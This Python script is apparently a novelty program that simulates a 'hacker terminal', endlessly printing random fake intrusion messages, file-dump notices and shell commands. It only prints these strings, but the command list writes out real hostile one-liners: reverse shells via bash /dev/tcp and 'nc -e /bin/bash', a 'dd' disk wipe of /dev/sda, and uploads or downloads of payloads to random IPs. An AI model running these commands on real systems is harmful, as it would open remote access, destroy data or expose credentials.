def main(data):
    import os
    import random
    import time
    import winsound
    import sys

    os.system("color a")
    os.system("title Skid Terminal Premium v1.91.33")
    hex_chars = "0123456789ABCDEF"
    error_triggers = ["[!]", "[-]"]

    fake_countries = [
        "USA 🇺🇸", "Russia 🇷🇺", "Germany 🇩🇪", "China 🇨🇳", "Brazil 🇧🇷",
        "India 🇮🇳", "France 🇫🇷", "UK 🇬🇧", "Japan 🇯🇵", "Australia 🇦🇺"
    ]

    def cls():
        os.system("cls")

    def play_beep():
            winsound.Beep(random.randint(600, 1200), 100)

    def generate_hex_line(length=32):
        return ' '.join(random.choice(hex_chars) + random.choice(hex_chars) for _ in range(length))

    def slow_type(text, delay=0.02, beep=False):
        for char in text:
            sys.stdout.write(char)
            
            sys.stdout.flush()
            time.sleep(delay)
        print()

    def error_flash_sequence(text):
        os.system("color c")
        play_beep()
        print(text)
        for _ in range(random.randint(1, 2)):
            print(random.choice([
                "▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓",
                ">>> SYSTEM BREACH DETECTED <<<",
                "!!! CRITICAL ERROR !!!",
                "[!] ALERT: Cyber Defense Triggered",
                ">>> ROLLBACK INITIATED <<<",
                "### WARNING: TRACE ACTIVE ###",
            ]))
            play_beep()
            time.sleep(0.05)
        os.system("color a")

    def print_with_drama(text):
        if any(err in text for err in error_triggers):
            error_flash_sequence(text)
        else:
            print(text)
    def fake_loading_bar(task="Processing"):
        total = random.randint(20, 40)
        for i in range(total):
            sys.stdout.write(f"\r{task} [{'=' * i}{' ' * (total - i)}] {int(i / total * 100)}%")
            sys.stdout.flush()
            time.sleep(0.02)
        
        sys.stdout.write(f"\r{task} [{'=' * total}] 100% DONE\n")
        sys.stdout.flush()
        time.sleep(0.5)

    def fake_login_sequence():
        slow_type("Initializing secure terminal...\n", 0.03)
        time.sleep(0.3)
        slow_type("Authenticating user: root@localhost")
        slow_type("Password: ********", 0.08)
        time.sleep(0.4)
        slow_type("Access Granted. Welcome back, operator.\n", 0.03)
        time.sleep(0.3)
        fake_loading_bar("Loading modules")
        fake_loading_bar("Establishing encrypted tunnel")
        time.sleep(0.5)
        
        
        

    def simulate_trace():
        ip = f"{random.randint(10, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        country = random.choice(fake_countries)
        return f"[TRACE] Located IP {ip} → {country}"

    def boot_animation():
        steps = [
            "[BOOT] Initializing virtual kernel...",
            "[BOOT] Mounting darknet drive...",
            "[BOOT] Injecting shellcode into memory...",
            "[BOOT] Spoofing MAC address...",
            "[BOOT] Deploying proxy mesh...",
            "[BOOT] Faking GPS coordinates...",
            "[BOOT] Hashing XOR salted passwords...",
            "[INFO] Version: Skid Terminal Premium v1.91.33"
        ]
        for step in steps:
            slow_type(step, 0.015)
            time.sleep(0.2)  
        time.sleep(1.5)
        cls()
        time.sleep(1)
        play_beep()
        slow_type("Thank you for purchasing Skid Terminal.",0.03)
        time.sleep(1)
        cls()
        
        slow_type("System initiated...",0.02)
        slow_type("Entering skid mode.",0.02)
        time.sleep(1)
        cls()
        time.sleep(1)

    # realtime nonsense generator
    def log_ip():
        return f"[LOG] Connecting to {random.randint(10,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

    def show_status():
        return random.choice([
            #error causing:
            "[!] Unexpected kernel panic!",
            "[!] Brute force triggered lockout!",
            "[!] System integrity compromised.",
            "[-] Malicious syscall detected.",
            "[!] VPN dropped - IP exposed!",
            "[!] Launching DDoS payload...",
            "[-] Connection refused. Retrying...",
            "[!] Trace detected!",
            "[+] Injecting botnet node...",
            "[*] Harvesting credentials...",
            "[+] Session hijacked.",
            #safe:
            "[~] Reconnecting to VPN service.",
            "[?] Unknown host provided.",
            "[+] Launching B.F.E. attack.",
            "[*] Injecting dll payload.",
            "[+] Locating nearest 'McDonalds fast food chain'.",
            "[+] Exiting skid mode.",
            "[+] Deploying anti-forensics...",
            "[*] Compiling zero-day exploit...",
            "[~] Listening on port 31337...",
            "[+] Replacing DNS entries...",
            "[*] Encrypting payload with triple-XOR...",
            "[+] Simulating network latency...",
            "[?] Resolving domain spoof...",
            "[~] Intercepting browser cookies...",
            "[*] Activating rootkit camouflage...",
            "[+] Pivoting to internal subnet...",
            "[~] Parsing SSL handshakes...",
            "[*] Extracting hashed credentials...",
            "[+] Deploying steganographic payload...",
            "[*] Faking HTTP 200 OK headers...",
            "[+] Encoding packets in base1337...",
            "[?] Analyzing CAPTCHA bypass response...",
            "[+] Downloading payload from Tor hidden service...",
            "[~] Executing ghost protocol handshake...",
            "[+] Compiling malware for ARMv7...",
            "[*] Injecting shellcode into GPU threads...",
            "[+] Relaying traffic through coffee machine...",
            "[~] Hijacking printer firmware...",
            "[+] Scraping metadata from .pdf archives...",
            "[?] Awaiting signal from deepweb oracle...",
            "[+] Building rainbow table using Minecraft shaders...",
            "[*] Connecting to IRC command server...",
            "[+] Spawning decoy terminals...",
            "[~] Obfuscating MAC address using l33tmask...",
            "[*] Syncing with time-travel proxy node...",
            "[+] Injecting .jar into JVM subsystem...",
            "[~] Bribing AI with cat pictures...",
            "[+] Deploying reverse unicorn shell...",
            "[*] Emulating Tesla autopilot firmware...",
            "[~] Parsing blockchain transaction noise...",
            "[+] Reticulating splines...",
            #f strings:
            f"[~] Found {random.randint(1,69)} exposed proxies.",
            f"[~] {random.randint(1,12)} vulnurabilities found in target.",
            f"[~] Spoofing {random.randint(1,5)} MAC addresses simultaneously...",
            f"[+] Detected {random.randint(1000,9999)} active nodes on subnet...",
            f"[*] Allocating {random.randint(16,512)}MB of virtual RAM...",
            f"[+] Injecting payload into PID {random.randint(1000,99999)}...",
            f"[~] Capturing keystrokes from {random.randint(2,9)} devices...",
            f"[*] Downloaded {random.randint(10,500)}GB of sensitive data...",
            f"[+] Compressing files using ultra-quantum ZIP level {random.randint(1,10)}...",
            f"[~] Spoofed {random.randint(50,150)} ARP packets...",
            f"[+] Generating {random.randint(100000,999999)} RSA keys...",
            f"[*] Tunneling through port {random.choice([22, 80, 443, 1337, 31337])}...",
            f"[~] Hashing with {random.choice(['SHA256', 'MD5', 'SHA1', 'SHA3'])} algorithm...",
            f"[+] Mined {random.uniform(0.0001, 0.9999):.4f} BTC from dead wallets...",
            f"[*] Found {random.randint(1,10)} unsecured IoT devices nearby...",
            f"[+] Extracting {random.randint(3,7)} zip bombs from email attachments...",
            f"[~] Masking IP as 127.0.0.{random.randint(1,254)}...",
            f"[+] Injecting {random.randint(1,10)} trojans into network stream...",
            f"[*] Generating fake passports for {random.randint(2,6)} identities...",
            f"[~] Emulating {random.randint(2,4)} quantum CPU threads...",
            f"[+] Deploying {random.randint(1,5)} fake login portals...",
            f"[*] Cycling through {random.randint(1,100)} VPN exit nodes..."
        ])

    def dump_file():
        files = [
            "/etc/passwd", "/root/.ssh/id_rsa", "C:\\Windows\\System32\\drivers\\atm.sys",
            f"/var/lib/{''.join(random.choices('abcdef0123456789', k=8))}.db",
            "/etc/shadow", "/home/user/.bash_history", "/var/log/auth.log", 
            "/root/.bashrc", "/var/log/syslog", "/var/www/html/index.php", 
            "/etc/hosts", "/usr/local/bin/suspicious_script.sh", 
            "/tmp/{''.join(random.choices('abcdef0123456789', k=8))}.log",
            "/root/.gnupg/secring.gpg", "/etc/ssl/private/cert.key", 
            "C:\\Program Files\\Common Files\\crypt.dll", 
            "C:\\Users\\Administrator\\AppData\\Local\\Temp\\tempfile.tmp"
        ]
        return f"[DATA] Dumping {random.choice(files)}"

    def hex_dump():
        return f"[0x{random.randint(1000,9999):04X}] {generate_hex_line()}"

    def debug_thread():
        return f"[DEBUG] Thread-{random.randint(1, 99)}: {generate_hex_line(16)}"

    def fake_command():
        return random.choice([
            f"$ nmap -p- -A {random.randint(10,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            f"$ ssh root@{random.randint(10,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            f"$ curl -X POST {random.choice(['http://', 'https://'])}{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}:8080/upload --data-binary @payload.bin",
            f"$ ping -c 10 {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            f"$ traceroute {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            f"$ netstat -an | grep ':443'",
            f"$ ifconfig eth0 down && ifconfig eth0 up",
            f"$ arp -s {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)} {random.randint(1,255)}:{random.randint(1,255)}:{random.randint(1,255)}:{random.randint(1,255)}:{random.randint(1,255)}:{random.randint(1,255)}",
            f"$ iptables -A INPUT -s {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)} -j DROP",
            f"$ tcpdump -i eth0 -nn -s0 -v port 80",
            f"$ dd if=/dev/zero of=/dev/sda bs=1M count=1000",
            f"$ openssl req -new -keyout /etc/ssl/private/server.key -out /etc/ssl/certs/server.csr",
            f"$ curl -X GET 'http://{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}:8080/status'",
            f"$ wget --spider {random.choice(['http://', 'https://'])}{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            f"$ git clone https://github.com/{random.choice(['repo1', 'repo2', 'repo3'])}.git",
            f"$ echo 'shellcode_here' > /tmp/malicious_payload.sh && chmod +x /tmp/malicious_payload.sh && ./tmp/malicious_payload.sh",
            f"$ sudo mount -o loop /dev/loop0 /mnt/iso",
            f"$ python3 -m http.server {random.randint(8000, 9000)}",
            f"$ wget -O /dev/null {random.choice(['http://', 'https://'])}{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}:8080/evilfile",
            f"$ bash -i >& /dev/tcp/{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}/4444 0>&1",
            f"$ ncat -lvnp 8080",
            f"$ cat /proc/net/tcp | grep 80",
            f"$ systemctl restart apache2.service",
            f"$ lsof -i :80",
            f"$ python -c 'import socket; s = socket.socket(); s.connect(({random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}, 80))'"
            f"$ nc {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)} 8080",
            f"$ sudo ip link set dev eth0 mtu 9000",
            f"$ sudo service nginx reload",
            f"$ curl --data 'username=admin&password=12345' {random.choice(['http://', 'https://'])}{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            f"$ nc -e /bin/bash {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)} 4444",
            f"$ sudo apt-get install -y metasploit-framework",
            f"$ apt-get update && apt-get upgrade -y",
            f"$ rm -rf /tmp/*",
            f"$ ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa",
            f"$ nmap -p 80 --open {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        ])

    #shitty way to do probabilities:
    actions = [
        show_status,show_status,
        dump_file,dump_file, 
        hex_dump, 
        debug_thread,
        fake_command,fake_command,
        simulate_trace]


    # Startup
    cls()
    fake_login_sequence()
    cls()
    boot_animation()



    try:
        startDelay = 1.0
        while True:
            output = random.choice(actions)()
            print_with_drama(output)
            time.sleep(random.uniform(startDelay/2, startDelay))
            if startDelay>0.08:
                startDelay/=1.08

            
    except KeyboardInterrupt:
        os.system("color 7")
        print("\n[!] Operation aborted by user.")

def help():
    return "opens skid terminal","This is one of my older projects. Feel free to delete this."